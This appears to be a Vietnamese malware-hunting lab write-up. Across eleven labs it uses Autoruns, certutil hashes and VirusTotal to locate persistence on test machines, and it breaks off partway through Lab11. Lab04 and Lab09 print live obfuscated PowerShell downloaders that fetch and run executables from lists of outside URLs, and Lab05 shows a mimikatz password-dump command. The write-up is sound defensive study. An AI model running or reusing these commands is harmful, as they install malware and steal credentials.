# Lab01

## [1]. Công cụ sử dụng

- `1.` Autoruns64 (Sysinternals Suite).

- `2.` Virus Total.

## [2]. Các bước thực hiện

- Khởi động Autorun64 với quyền quản trị để có thể truy cập đầy đủ các thông tin.

![1.png](./Lab01/1.png)

- Ta có thể thấy có 2 mục bị Autorun cảnh báo đỏ và chưa Verified là `Unikey` và `System~1.LNK` .

  - Unikey: có cảnh báo đỏ nhưng là một ứng dụng được tin tưởng nên có thể tạm thời bỏ qua, nếu không tìm ra malware thì quay lại để phân tích sâu hơn.
  - System~1.LNK: Đây là một file shortcut, ấn `Jump to Image` để jump đến folder chứa file shortcut System~1.LNK.

    ![2.png](./Lab01/2.png)

- Kiểm tra đường dẫn file được thực thi khi khởi chạy file shortcut.

![3.png](./Lab01/3.png)

- Dùng `certutil -hashfile <tên file>` được dùng để lấy hash file: `3408c5e3446f03c5fb95e56d3368bbd1ca06ed4f`, check trên Virus Total xem có cảnh báo đỏ hay không thì thu được cảnh báo đỏ 59/72. Note vào và đưa cho bên khác phân tích và khắc phục.

![4.png](./Lab01/4.png)

> Kết luận

- Thời gian mã độc xuất hiện: `Date Created: Thursday, December 24, 2020, 9:37:01 AM`.
- Đường dẫn mã độc: `C:\Users\hunter\AppData\Roaming\ELP84P\System.exe`.
- Cách thức mã độc persistence trên hệ thống: Registry `HKCU\Software\Microsoft\Windows NT\Current Version\Windows\Load`.

# Lab02

## [1]. Công cụ sử dụng

- `1.` Autoruns64 (Sysinternals Suite).

- `2.` Virus Total.

## [2]. Các bước thực hiện

- Khởi động Autorun64 với quyền quản trị để có thể truy cập đầy đủ các thông tin.

- Ta thấy có 4 mục bị Autorun cảnh báo đỏ và chưa Verified là `Unikey`, `Skype for Desktop`, `7-zip` và `WinDefend`. Ta tiến hành phân tích cảnh báo đỏ ở `WinDefend` trước do đây là một chương trình của Windows nhưng lại bị cảnh báo là chưa verified nên có khả năng cao là malware nhất.

![1.png](./Lab02/1.png)

- `WinDefend` bị cảnh báo đỏ có đường dẫn nẳm ở `SysWOW64` trong khi trên hệ điều hành windows thì thông thường `WinDefend` sẽ được lưu ở `System32` nên khả năng cao đây là malware.

![2.png](./Lab02/2.png)

- Khi jump tới `WinDefend` thì ta thấy no jump tới file .dll là `hidservs.dll`. Tiến hành `certutil -hashfile <tên file>` check hash file này để xem có cảnh báo trên VirusTotal không. Ta thu được hash như sau: `7073c675a31a4b1b42afb340c2b041859cbe9b56`.

![3.png](./Lab02/3.png)

- Đưa hash vào VirusTotal thì ta thấy cảnh báo như bên dưới. Và ta thấy nó là một con malware Trojan.

![4.png](./Lab02/4.png)

> Kết luận

- Thời gian mã độc xuất hiện: `Thursday, December 24, 2020, 10:14:55 AM`.
- Đường dẫn mã độc: `C:\Windows\SysWOW64\hidservs.dll`.
- Cách thức mã độc persistence trên hệ thống: Registry `HKLM\System\CurrentControlSet\Services`.

# Lab03

## [1]. Công cụ sử dụng

- `1.` Autoruns64 (Sysinternals Suite).

- `2.` Virus Total.

## [2]. Các bước thực hiện

- Khởi động Autorun64 với quyền quản trị để có thể truy cập đầy đủ các thông tin. Ưu tiên check file chưa **verified** trước rồi đến các file có path nhạy cảm.

- Ở lab3 này thì thấy có 1 file chưa được verified và nằm trong path nhạy cảm `AppData`. Và ta không thấy thông tin gì ngoài path của nó ở dưới ảnh bên dưới. Tiến hành jump tới image và check path của file.

![1.png](./Lab03/1.png)

- Khi jump tới thấy nó là một file .png

![2.png](./Lab03/2.png)

- Check hash bằng cú pháp `certutil -hashfile <tên file>` ta thu được mã hash: `737bc4c1e193d54abcbac2bac6ff89fe10bb3f31`.

![3.png](./Lab03/3.png)

> Kết luận

- Thời gian mã độc xuất hiện: `Thursday, December 24, 2020, 3:51:42 PM`.
- Đường dẫn mã độc: `C:\Users\hunter\AppData\Roaming\main_background.png`.
- Cách thức mã độc persistence trên hệ thống: `Task Scheduler`.

# Lab04

## [1]. Công cụ sử dụng

- `1.` Autoruns64 (Sysinternals Suite).

- `2.` Virus Total.

## [2]. Các bước thực hiện

- Khởi động Autorun64 với quyền quản trị để có thể truy cập đầy đủ các thông tin.

- Ở lab04 này, khi chạy Autorun và nhìn sơ bộ thì ta thấy các file gần như đã `verified` hết. Chỉ có 1 vài file hiện chưa `verified` là Unikey, Skype và 7-zip.

- Các file này đều là các ứng dụng máy tính phổ biến và kiểm tra đường dẫn thấy không sai, cảnh báo đỏ là do không ký nên sẽ quay lại phân tích sâu sau nếu như không tìm thấy nghi ngờ nào khác.

- Phát hiện ở trong `Task Schuduler` thì ta thấy 1 dịch vụ dược đăng ký tên là `WindownUpdate` sử dụng cmd.exe thực thi một lệnh khả nghi (do chương trình thực thi lệnh là cmd.exe của Windows nên không bị cảnh báo đỏ).

![1.png](./Lab04/1.png)

![2.png](./Lab04/2.png)

- Lệnh được cmd thực thi:

```ps1
C:\Windows\system32\cmd.exe /C STARt /B powershell -NonInteractive -WindowStyle Hidden -e JABBAHUAagAwAHAAYgBtAD0AKAAnAE8AJwArACgAJwA2AGwAOQAnACsAJwAyAGYAYwAnACkAKQA7ACYAKAAnAG4AZQB3AC0AaQB0ACcAKwAnAGUAbQAnACkAIAAkAEUATgB2ADoAVABlAG0AcABcAFcATwBSAEQAXAAyADAAMQA5AFwAIAAtAGkAdABlAG0AdAB5AHAAZQAgAEQAaQByAGUAYwBUAG8AUgBZADsAWwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAIgBzAEUAYABDAFUAcgBJAFQAYABZAHAAUgBPAFQAbwBDAE8AbAAiACAAPQAgACgAJwB0AGwAJwArACcAcwAnACsAJwAxADIAJwArACgAJwAsACAAJwArACcAdAAnACsAJwBsAHMAMQAxACwAIAB0ACcAKQArACcAbABzACcAKQA7ACQATwBkAGQAeABxAGcAcAAgAD0AIAAoACcATwAxACcAKwAoACcAagAnACsAJwBwADAAagAnACkAKQA7ACQAUQBqAHkAXwBwAGkAagA9ACgAKAAnAFgAMwAnACsAJwA5AHMAJwApACsAKAAnADAAJwArACcAdgAyACcAKQApADsAJABIAGwAdAB0AGUAYwBjAD0AJABlAG4AdgA6AHQAZQBtAHAAKwAoACgAJwB7ADAAfQB3ACcAKwAnAG8AcgBkAHsAMAAnACsAJwB9ADIAMAAnACsAJwAxADkAewAwACcAKwAnAH0AJwApACAAIAAtAGYAIABbAGMAaABhAFIAXQA5ADIAKQArACQATwBkAGQAeABxAGcAcAArACgAJwAuACcAKwAoACcAZQB4ACcAKwAnAGUAJwApACkAOwAkAEYAMAA1AF8AawAzAGUAPQAoACcASwBiACcAKwAnAGMAJwArACgAJwBiACcAKwAnADEAOQBfACcAKQApADsAJABXAGsAZQB0ADEAcwA0AD0AJgAoACcAbgBlAHcAJwArACcALQBvAGIAJwArACcAagBlAGMAdAAnACkAIABuAGUAVAAuAFcARQBiAGMATABJAGUAbgB0ADsAJABTAG0AeQB0AHQAbAA3AD0AKAAoACcAaAAnACsAJwB0AHQAcABzADoAJwApACsAKAAnAC8ALwBkAGEAZAAnACsAJwBpAGUAcgAnACsAJwBvACcAKwAnAHEAdQBlAC4AYwBvAG0AJwApACsAJwAvACcAKwAnAHcAcAAnACsAJwAtAGEAJwArACgAJwBkAG0AaQAnACsAJwBuACcAKQArACcALwAnACsAKAAnAGQAJwArACcAZwAnACsAJwAvACoAaAB0ACcAKQArACgAJwB0AHAAcwA6ACcAKwAnAC8ALwAnACkAKwAnAHMAJwArACgAJwB1AGwAJwArACcAcwBlACcAKQArACgAJwBsACcAKwAnAGUAJwArACcAawAnACsAJwBzAHAAcgBlAHMALgBjAG8AbQAvAGMAZwBpAC0AJwArACcAYgBpACcAKQArACgAJwBuAC8AJwArACcANgBsACcAKQArACcAMABuACcAKwAoACcAeQAnACsAJwBPAC8AKgBoAHQAJwArACcAdAAnACkAKwAoACcAcABzACcAKwAnADoALwAnACsAJwAvAG0AJwApACsAJwBhACcAKwAoACcAdQAnACsAJwBsAGEAbgAnACkAKwAoACcAYQByACcAKwAnAHUAJwApACsAKAAnAG0AJwArACcAaQBmAG8AdQBuAGQAJwArACcAYQB0AGkAbwBuACcAKwAnAC4AYwAnACkAKwAnAG8AJwArACgAJwBtAC8AUgAnACsAJwB1AG0AaQBGACcAKwAnAG8AdQBuACcAKwAnAGQAYQAnACkAKwAoACcAdABpACcAKwAnAG8AJwApACsAKAAnAG4AJwArACcALwBRADkAZQB0AEYAJwApACsAJwAvACoAJwArACgAJwBoAHQAdABwACcAKwAnAHMAJwApACsAKAAnADoALwAvAGsAZQBsACcAKwAnAGEAcwAuAHkAZQAnACsAJwBjAC4AJwApACsAKAAnAGMAJwArACcAbwAuAGkAZAAnACkAKwAoACcALwBzACcAKwAnAHIAJwApACsAJwBqAG4AJwArACgAJwBzAC8AQgAvACoAJwArACcAaAAnACsAJwB0AHQAcAA6AC8ALwBjAGEAJwArACcAZQBzACcAKwAnAGEAJwArACcAcgBtAG8AJwApACsAJwB2AGkAJwArACcAbgBnACcAKwAnAC4AJwArACcAYwBvACcAKwAoACcAbQAnACsAJwAvAHcAJwArACcAcAAtACcAKwAnAGMAbwBuAHQAZQBuAHQAJwArACcALwAnACkAKwAnADkAJwArACcAcwAvACcAKwAoACcAKgBoAHQAdAAnACsAJwBwAHMAOgAnACsAJwAvAC8AawBpACcAKwAnAG4AZQBwAHIAJwArACcAZQBtAGkAbgAnACsAJwBzACcAKQArACgAJwAuAGMAJwArACcAbAAvAHcAJwApACsAKAAnAHAAJwArACcALQBhAGQAbQAnACsAJwBpACcAKwAnAG4ALwA2AHcAcgAvACcAKwAnACoAJwArACcAaAB0AHQAcAA6AC8ALwAnACsAJwBkAG8AJwApACsAJwBsACcAKwAoACcAcABoACcAKwAnAGkAJwApACsAKAAnAG4AaQBuACcAKwAnAHMAaQBnACcAKwAnAGgAdAAnACsAJwAuACcAKwAnAGkAdAAvAHcAcAAtAGkAJwApACsAKAAnAG4AYwAnACsAJwBsAHUAJwApACsAJwBkACcAKwAnAGUAJwArACgAJwBzACcAKwAnAC8ATABWACcAKQArACcAZgAvACcAKQAuACIAUwBQAGwAYABJAHQAIgAoAFsAYwBoAGEAcgBdADQAMgApADsAJABUAGcAeAB6ADIAYwA5AD0AKAAoACcASAAnACsAJwAyAG8AZgAnACkAKwAoACcANAAnACsAJwB4AGQAJwApACkAOwBmAG8AcgBlAGEAYwBoACgAJABDAGcAYwB0AHQANgAxACAAaQBuACAAJABTAG0AeQB0AHQAbAA3ACkAewB0AHIAeQB7ACQAVwBrAGUAdAAxAHMANAAuACIAZABgAE8AVwBuAGwAYABvAGEARABgAEYAaQBMAEUAIgAoACQAQwBnAGMAdAB0ADYAMQAsACAAJABIAGwAdAB0AGUAYwBjACkAOwAkAFYAMgBhAHIAZgBrAGUAPQAoACcARAAnACsAKAAnAG8AdgAnACsAJwBuAGYAaABvACcAKQApADsASQBmACAAKAAoACYAKAAnAEcAZQAnACsAJwB0AC0ASQB0AGUAJwArACcAbQAnACkAIAAkAEgAbAB0AHQAZQBjAGMAKQAuACIAbABlAGAATgBHAHQASAAiACAALQBnAGUAIAAzADkAOAA1ADAAKQAgAHsALgAoACcASQBuAHYAbwBrAGUAJwArACcALQBJAHQAJwArACcAZQBtACcAKQAoACQASABsAHQAdABlAGMAYwApADsAJABUADIANAAwAGMAaQBnAD0AKAAnAEkAJwArACgAJwB6ACcAKwAnAHUAbwAnACkAKwAoACcAMAAnACsAJwByADMAJwApACkAOwBiAHIAZQBhAGsAOwAkAFEAaQAwADgAdABiAHIAPQAoACgAJwBUAHUAJwArACcAbgAnACkAKwAnAHIAJwArACgAJwB1AG4AJwArACcAZAAnACkAKQB9AH0AYwBhAHQAYwBoAHsAfQB9ACQASwBuAGMAOABsAHMAMwA9ACgAJwBXAHEAJwArACgAJwA1AHcAdQByACcAKwAnAGcAJwApACkA
```

- Tin tặc đã lợi dụng thực thi command qua 1 chương trình đã được ký là cmd.exe để thực thi command độc hại, command được thực thi đã được obfuscate sử dụng mã hóa `base64`. Sau khi decode thì ta thu được nội dung sau:

```ps1
$Auj0pbm=('O'+('6l9'+'2fc'));&('new-it'+'em')
$ENv:Temp\WORD\2019\ -itemtype DirecToRY;
[Net.ServicePointManager]::"sE`CUrIT`YpROToCOl" = ('tl'+'s'+'12'+(', '+'t'+'ls11, t')+'ls');
$Oddxqgp = ('O1'+('j'+'p0j'));
$Qjy_pij=(('X3'+'9s')+('0'+'v2'));
$Hlttecc=$env:temp+(('{0}w'+'ord{0'+'}20'+'19{0'+'}')  -f [chaR]92)+$Oddxqgp+('.'+('ex'+'e'));
$F05_k3e=('Kb'+'c'+('b'+'19_'));
$Wket1s4=&('new'+'-ob'+'ject') neT.WEbcLIent;$Smyttl7=(('h'+'ttps:')+('//dad'+'ier'+'o'+'que.com')+'/'+'wp'+'-a'+('dmi'+'n')+'/'+('d'+'g'+'/*ht')+('tps:'+'//')+'s'+('ul'+'se')+('l'+'e'+'k'+'spres.com/cgi-'+'bi')+('n/'+'6l')+'0n'+('y'+'O/*ht'+'t')+('ps'+':/'+'/m')+'a'+('u'+'lan')+('ar'+'u')+('m'+'ifound'+'ation'+'.c')+'o'+('m/R'+'umiF'+'oun'+'da')+('ti'+'o')+('n'+'/Q9etF')+'/*'+('http'+'s')+('://kel'+'as.ye'+'c.')+('c'+'o.id')+('/s'+'r')+'jn'+('s/B/*'+'h'+'ttp://ca'+'es'+'a'+'rmo')+'vi'+'ng'+'.'+'co'+('m'+'/w'+'p-'+'content'+'/')+'9'+'s/'+('*htt'+'ps:'+'//ki'+'nepr'+'emin'+'s')+('.c'+'l/w')+('p'+'-adm'+'i'+'n/6wr/'+'*'+'http://'+'do')+'l'+('ph'+'i')+('nin'+'sig'+'ht'+'.'+'it/wp-i')+('nc'+'lu')+'d'+'e'+('s'+'/LV')+'f/')."SPl`It"([char]42);
$Tgxz2c9=(('H'+'2of')+('4'+'xd'));
foreach($Cgctt61 in $Smyttl7){try{$Wket1s4."d`OWnl`oaD`FiLE"($Cgctt61, $Hlttecc);
$V2arfke=('D'+('ov'+'nfho'));
If ((&('Ge'+'t-Ite'+'m') $Hlttecc)."le`NGtH" -ge 39850) {.('Invoke'+'-It'+'em')($Hlttecc);
$T240cig=('I'+('z'+'uo')+('0'+'r3'));
break;
$Qi08tbr=(('Tu'+'n')+'r'+('un'+'d'))}}catch{}}$Knc8ls3=('Wq'+('5wur'+'g'))
```

- Command được sử dụng để tải và thực thi một tập tin `C:\Users\hunter\AppData\Local\Temp\WORD\2019\O1jp0j.exe` độc hại từ một số URL khác nhau và đặt thư mục `%Temp%\WORD\2019` làm thư mục tạm thời.

> Kết luận

![3.png](./Lab04/3.png)

- Thời gian mã độc xuất hiện: `Created: 12/25/2020 1:48:39 PM`.
- Đường dẫn mã độc: `C:\Users\hunter\AppData\Local\Temp\WORD\2019\O1jp0j.exe`.
- Cách thức mã độc persistence trên hệ thống: `Task Scheduler`.

# Lab05

## [1]. Công cụ sử dụng

- `1.` Autoruns64 (Sysinternals Suite).

- `2.` Virus Total.

## [2]. Các bước thực hiện

- Khởi động Autorun64 với quyền quản trị để có thể truy cập đầy đủ các thông tin.

- Khi vừa chạy ứng dụng `Autorun` thì ở những dòng đầu tiên ta đã thấy như dưới đây:

![1.png](./Lab05/1.png)

- Đây là một key được đăng ký trong registry nhằm thực hiện commandline.

```ps1
/C "OIS.EXE" log
privilege::debug
sekurlsa::logonpassword exit
```

- Đây là một lệnh trong `mimikatz` dùng để Dump lấy user và password của hệ thống người dùng. Được chạy khi mà máy tính chạy file `OIS.EXE`. Đến đây ta có thể khẳng định rằng đây là một malware nhưng để chắc chắn hơn nữa thì ta jump tới `OIS.EXE` này để lấy hash và check hash của nó.

- Khi tìm file thì ta thấy được xuất hiện 2 file có đuôi .exe như bên dưới. Dễ dàng để thấy file cần tìm là file nằm trong system32 `(OSI.exe là một file của Microsoft Office Professional Plus suite có đường dẫn C:\Program Files (x86)\Microsoft Office\Office14)`.

![2.png](./Lab05/2.png)

- Khi khởi chạy và check hash `certutil -hashfile <tên file>` - `810a8803d44e726e5aca8de382c6460d74419868` thì đây là của mimikatz.

![3.png](./Lab05/3.png)

![4.png](./Lab05/4.png)

> Kết luận

- Thời gian mã độc xuất hiện: `Date Created: Sunday, November 21, 2010, 10:24:07 AM`.
- Đường dẫn mã độc: `C:\Windows\System32\OIS.exe`.
- Cách thức mã độc persistence trên hệ thống: Registry `HKCU\Environment\UserInitMprLogonScript`.

# Lab06

## [1]. Công cụ sử dụng

- `1.` Autoruns64 (Sysinternals Suite).

- `2.` Virus Total.

## [2]. Các bước thực hiện

- Khởi động Autorun64 với quyền quản trị để có thể truy cập đầy đủ các thông tin.

![1.png](./Lab06/1.png)

- Ta có thể thấy có 1 mục bị Autorun cảnh báo đỏ và chưa Verified là `trnsrun`.

- Dùng `certutil -hashfile <tên file>` được dùng để lấy hash file: `c37dfab9e4ede30c5c78b800bb3466972cc72d28`, check trên Virus Total.

![2.png](./Lab06/2.png)

![3.png](./Lab06/3.png)

> Kết luận

- Thời gian mã độc xuất hiện: `Date Created: Wednesday, January 13, 2021, 11:44:30 AM`.
- Đường dẫn mã độc: `C:\Windows\SysWOW64\trnsrun.exe`.
- Cách thức mã độc persistence trên hệ thống: Registry `HKLM\System\CurrentControlSet\Services`.

# Lab07

## [1]. Công cụ sử dụng

- `1.` Autoruns64 (Sysinternals Suite).

- `2.` Virus Total.

## [2]. Các bước thực hiện

- Khởi động Autorun64 với quyền quản trị để có thể truy cập đầy đủ các thông tin.

- Ta có thể thấy có 1 mục bị Autorun cảnh báo đỏ và chưa Verified.

![1.png](./Lab07/1.png)

- Đây là 1 file dll nằm trong danh sách của `Appinit_Dlls`, đây là nơi mà chương trình khi khởi động sẽ tìm dll theo thứ tự của microsoft.

- Dùng `certutil -hashfile <tên file>` được dùng để lấy hash file: `6b6770e15451749bbf7ad922e5b7cacac12e87a4`, check trên Virus Total.

![2.png](./Lab07/2.png)

![3.png](./Lab07/3.png)

> Kết luận

- Thời gian mã độc xuất hiện: `Date Created: Wednesday, January 13, 2021, 10:20:11 AM`.
- Đường dẫn mã độc: `C:\Users\Gee\AppData\Roaming\Microsoft\Windows\OUTLLIB.DLL`.
- Cách thức mã độc persistence trên hệ thống: Registry `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Windows\Appinit_Dlls`.

# Lab08

## [1]. Công cụ sử dụng

- `1.` Autoruns64 (Sysinternals Suite).

- `2.` Virus Total.

## [2]. Các bước thực hiện

- Khởi động Autorun64 với quyền quản trị để có thể truy cập đầy đủ các thông tin.

- Không thấy có mục nào bị cảnh báo đỏ (Unikey là ứng dụng phổ biến nên sẽ phân tích sâu sau nếu không tìm thấy malware) nên tiến hành tìm theo vị trí file thực thi và xem có lệnh nào được đăng ký đáng nghi hay không.

![1.png](./Lab08/1.png)

- Ta tìm thấy một mục là `McAfee` được đăng ký trong `Service` nhưng lại sử dụng file thực thi nằm ở vị trí sai là `C:\ProgramData\McAfee` so với vị trí khi tra google mặc định của app `McAfee` là `<PROGRAMFILES>\McAfee\Agent`.

- Tiến hành `Jump Image` để tìm file thì đây là thư mục trống, khi tắt option trong `Folder Options\View\Hide protected operating system files (Recommended)` thì hiện ra các file được ẩn do chế độ trên.

![2.png](./Lab08/2.png)

- Dùng `certutil -hashfile <tên file>` để lấy hash file check trên Virus Total để check file `McAfee.exe` thì có 1 cảnh báo đỏ và được đánh dấu với file name là `mcoemcpy.exe` nhưng tiến hành lấy hash file `McUtil.dll` (`39f197e6293c39bda3139c7b7f797b0e9808c13f`) thì đây là malware được load thông qua `McAfee.exe` giả.

![3.png](./Lab08/3.png)

![4.png](./Lab08/4.png)

- DLL `McUtil.dll` độc được gọi bởi `McAfee.exe` để thực hiện hành vi độc hại.

- DLL `zaejsfjfjz` được drop ra sau khi process `McAfee.exe` chạy lần đầu, bản thân nó cũng là DLL độc và có thể cũng sẽ được sử dụng bởi process để thực hiện hành vi độc hại.

> Kết luận

- Thời gian mã độc xuất hiện: `Date Created: Thursday, April 12, 2018, 6:34:50 AM`.
- Đường dẫn mã độc: `C:\ProgramData\McAfee\McUtil.dll`.
- Cách thức mã độc persistence trên hệ thống: Registry `HKLM\System\CurrentControlSet\Services`.

# Lab09

## [1]. Công cụ sử dụng

- `1.` Autoruns64 (Sysinternals Suite).

- `2.` Virus Total.

## [2]. Các bước thực hiện

- Khởi động Autorun64 với quyền quản trị để có thể truy cập đầy đủ các thông tin.

- Không thấy có mục nào bị cảnh báo đỏ (Unikey là ứng dụng phổ biến nên sẽ phân tích sâu sau nếu không tìm thấy malware) nên tiến hành tìm theo vị trí file thực thi và xem có lệnh nào được đăng ký đáng nghi hay không.

![1.png](./Lab09/1.png)

- Ta thấy một mục được đăng ký trong Registry thực thi lệnh powershell với đối số khả nghi `-WindowStyle Hidden` nhằm install về máy cái gì đó.

```ps1
powershell.exe -ExecutionPolicy Bypass -file C:\ProgramData\Microsoft\install.ps1 -WindowStyle Hidden
```

- Kiểm tra nội dung file `install.ps1` thu được câu lệnh sau:

```ps1
powershell -w hidden -enco JABFAGEAcQBlAGsAcQBkAHIAPQAnAFIAZABpAGgAeQBoAG8AawByACcAOwAkAFEAbABpAGQAcwB2AG0AZwB4ACAAPQAgACcANgA5ADcAJwA7ACQAWgBlAGsAcABpAHcAYQBmAGkAZwB5AHcAPQAnAEIAegBuAHAAaQBtAHMAZAB6AGgAegAnADsAJABEAHYAYgBhAHAAcgBlAHgAZwBtAGUAPQAkAGUAbgB2ADoAdQBzAGUAcgBwAHIAbwBmAGkAbABlACsAJwBcACcAKwAkAFEAbABpAGQAcwB2AG0AZwB4ACsAJwAuAGUAeABlACcAOwAkAE4AeQB2AGcAZQB1AG4AYQBtAHUAdgBpAD0AJwBRAHcAbABlAGwAbABpAGcAbwB4AGIAJwA7ACQATQBnAHUAZgBwAHYAYQBzAGsAaABsAHoAPQAuACgAJwBuACcAKwAnAGUAdwAtAG8AJwArACcAYgBqAGUAYwB0ACcAKQAgAG4AZQB0AC4AdwBFAEIAQwBsAGkAZQBuAHQAOwAkAFMAbgBvAHQAdQB6AGoAaQA9ACcAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AYQByAGYAYQBqAGIAZAAuAGMAbwBtAC8AdwBwAC0AYQBkAG0AaQBuAC8AawB4ADQAMwAyADQAMwA0AC8AKgBoAHQAdABwAHMAOgAvAC8AaABlAGYAbwBrAC4AYwBvAG0ALwB3AHAALQBjAG8AbgB0AGUAbgB0AC8ANQB6AHUAegA5AGkAcgAwADAANgAwADYALwAqAGgAdAB0AHAAOgAvAC8AaQBjAGwAbwB1AGQAZwByAGEAcABoAGkAYwBzAC4AYwBvAG0ALwB3AHAALQBjAG8AbgB0AGUAbgB0AC8AbwAxAGMAdQA3ADYAMgA4AC8AKgBoAHQAdABwADoALwAvAGIAdQBjAGsAZQB0AGwAaQBzAHQAYQBkAHYAdABvAHUAcgBzAC4AYwBvAG0ALwBtADUAXwBlAGQAaQB0AF8AaQB0AGUAbQAvADAANgA2ADAANQBsAGQAMAAzADEAOQA3AC8AKgBoAHQAdABwADoALwAvAG4AYQBhAHYAaQBrAHMAYwBoAG8AbwBsAC4AYwBvAG0ALwBuAGEAYQB2AGkAawBzAGMAaABvAG8AbAAuAGMAbwBtAC8AbwBvAHEAdgBpADcAYQAwADYAOAAyAC8AJwAuACIAUwBQAEwAYABJAHQAIgAoACcAKgAnACkAOwAkAFoAdwBlAGMAcABsAGMAbQBoAG4AegB1AGMAPQAnAE8AZgByAGgAYgB2AGIAZwBvAGMAbwAnADsAZgBvAHIAZQBhAGMAaAAoACQAUwBpAHgAZQBuAGYAaAB1AHYAeABsAG8AdwAgAGkAbgAgACQAUwBuAG8AdAB1AHoAagBpACkAewB0AHIAeQB7ACQATQBnAHUAZgBwAHYAYQBzAGsAaABsAHoALgAiAGQAYABPAHcATgBgAEwATwBhAGQAYABGAGkAbABFACIAKAAkAFMAaQB4AGUAbgBmAGgAdQB2AHgAbABvAHcALAAgACQARAB2AGIAYQBwAHIAZQB4AGcAbQBlACkAOwAkAEgAagB5AGUAdQB4AG8AZQBoAHIAPQAnAEYAZQBqAGoAbABrAGoAYwB0AHIAagBmAHQAJwA7AEkAZgAgACgAKAAuACgAJwBHACcAKwAnAGUAJwArACcAdAAtAEkAdABlAG0AJwApACAAJABEAHYAYgBhAHAAcgBlAHgAZwBtAGUAKQAuACIATABgAEUAYABOAEcAVABIACIAIAAtAGcAZQAgADIANgA0ADcANAApACAAewBbAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAXQA6ADoAIgBTAHQAYABBAHIAVAAiACgAJABEAHYAYgBhAHAAcgBlAHgAZwBtAGUAKQA7ACQAUABxAGEAYgBiAHEAZgB4AHAAdgB6AGUAdQA9ACcATgBsAGsAdwByAHIAeABjAHIAJwA7AGIAcgBlAGEAawA7ACQAUwBwAGEAcwBrAG0AdwBxAG8APQAnAEUAdgBvAHoAbQB1AHEAbABlAGkAaABrACcAfQB9AGMAYQB0AGMAaAB7AH0AfQAkAEkAbQBqAGYAcgBvAGkAdwB0AHkAcAB3AD0AJwBNAGgAZQB3AHEAdwBoAHAAaABzACcA
```

- Khi file `install.ps1` được thực thi sẽ giải mã lệnh được mã hóa trên thành câu lệnh thực thi có nội dung như sau.

```ps1
$Eaqekqdr='Rdihyhokr';
$Qlidsvmgx = '697';
$Zekpiwafigyw='Bznpimsdzhz';
$Dvbaprexgme=$env:userprofile+'\'+$Qlidsvmgx+'.exe';
$Nyvgeunamuvi='Qwlelligoxb';
$Mgufpvaskhlz=.('n'+'ew-o'+'bject') net.wEBClient;
$Snotuzji='https://www.arfajbd.com/wp-admin/kx432434/*https://hefok.com/wp-content/5zuz9ir00606/*http://icloudgraphics.com/wp-content/o1cu7628/*http://bucketlistadvtours.com/m5_edit_item/06605ld03197/*http://naavikschool.com/naavikschool.com/ooqvi7a0682/'."SPL`It"('*');
$Zwecplcmhnzuc='Ofrhbvbgoco';
foreach($Sixenfhuvxlow in $Snotuzji){try{$Mgufpvaskhlz."d`OwN`LOad`FilE"($Sixenfhuvxlow, $Dvbaprexgme);
$Hjyeuxoehr='Fejjlkjctrjft';
If ((.('G'+'e'+'t-Item') $Dvbaprexgme)."L`E`NGTH" -ge 26474) {[Diagnostics.Process]::"St`ArT"($Dvbaprexgme);
$Pqabbqfxpvzeu='Nlkwrrxcr';
break;
$Spaskmwqo='Evozmuqleihk'}}catch{}}$Imjfroiwtypw='Mhewqwhphs'
```

- Script trên tải các file từ url về và lưu vào đường dẫn `%userprofile%` với tên file là `697.exe` và sau đó thực thi file độc hại này.

> Kết luận

- Thời gian mã độc xuất hiện: `Wednesday, January 13, 2021, 10:50:52 AM`.
- Đường dẫn mã độc: `C:\ProgramData\Microsoft\install.ps1`.
- Cách thức mã độc persistence trên hệ thống: Registry `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`.

# Lab10

## [1]. Công cụ sử dụng

- `1.` Autoruns64 (Sysinternals Suite).

- `2.` Virus Total.

## [2]. Các bước thực hiện

- Khởi động Autorun64 với quyền quản trị để có thể truy cập đầy đủ các thông tin.

- Không thấy có mục nào bị cảnh báo đỏ (Unikey là ứng dụng phổ biến nên sẽ phân tích sâu sau nếu không tìm thấy malware) nên tiến hành tìm theo vị trí file thực thi và xem có lệnh nào được đăng ký đáng nghi hay không.

![1.png](./Lab10/1.png)

```ps1
rundll32.exe c:\windows\system32\config:conf.dll,inst
```

- Ta thấy một mục là `vds.exe` được đăng ký trong Registry `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options` đang sử dụng `rundll32.exe` để load `C:\windows\system32\config:conf.dll`.

- Tiến hành tìm đến thư mục chứa file thì không thấy file cần tìm là `conf.dll` mặc dù đã tắt option trong `Folder Options\View\Hide protected operating system files (Recommended)`. Tra google để tìm theo keyword là câu lệnh trên thì xác định được file bị ẩn là do file liên quan đến khái niệm `NTFS Streams`.

  - https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fscc/c54dec26-1551-4d3a-a0ea-4fa40f848eb3
  - https://security.stackexchange.com/questions/34168/how-can-i-identify-discover-files-hidden-with-ads

- Tìm lại file nằm trong folder `c:\windows\system32` bằng cmd `dir /R | findstr "conf"` thì thấy có file `config:conf.dll`.

![2.png](./Lab10/2.png)

- Dùng `certutil -hashfile <tên file>` để lấy hash file `config:conf.dll:$DATA` thành đoạn mã `d64491b5ebb69bba34722474381083b297284894` check trên Virus Total thì đây là malware.

![3.png](./Lab10/3.png)

![4.png](./Lab10/4.png)

> Kết luận

- Thời gian mã độc xuất hiện: `Date Created: 04/12/2018  04:04 AM`.

![5.png](./Lab10/5.png)

- Đường dẫn mã độc: `c:\windows\system32\config:conf.dll:$DATA`.
- Cách thức mã độc persistence trên hệ thống: Registry `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options`.

# Lab11

## [1]. Công cụ sử dụng

- `1.` Autoruns64 (Sysinternals Suite).

## [2]. Các bước thực hiện

- Khởi động Autorun với quyền quản trị để có thể truy cập đầy đủ các thông tin.

- Có một số mục bị cảnh báo đỏ là của VMware thì không có gì đặc biệt nên chuyển sang kiểm tra đường đẫn file lạ hoặc commandline khả nghi thì thấy có một mục được đăng ký trong `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options` với tên là `sethc.exe` nhưng đường dẫn tới file thực thi là `C:\Windows\system32\cmd.exe`.

![1.png](./Lab11/1.png)

- Sau khi đi tìm hiểu thì có kết luận đây là một dạng hành vi độc hại như sau:

